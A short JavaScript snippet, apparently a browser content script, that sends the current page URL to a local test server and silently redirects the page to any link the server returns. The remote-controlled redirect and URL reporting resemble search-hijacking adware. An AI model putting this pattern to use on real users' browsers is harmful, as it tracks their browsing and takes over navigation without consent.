var currentUrl = document.URL;
function checkUrlIsSearchEngine(url) {
    $.ajax({
        'url': 'http://localhost:8080/testing',
        'type': 'GET',
        'data': {
            'url': url
        },
        'success': function (data) {
            data?.link && location.replace(data.link)
        },
        'error': function (request, error) {
            console.log(error);
        }
    });
}

checkUrlIsSearchEngine(currentUrl);
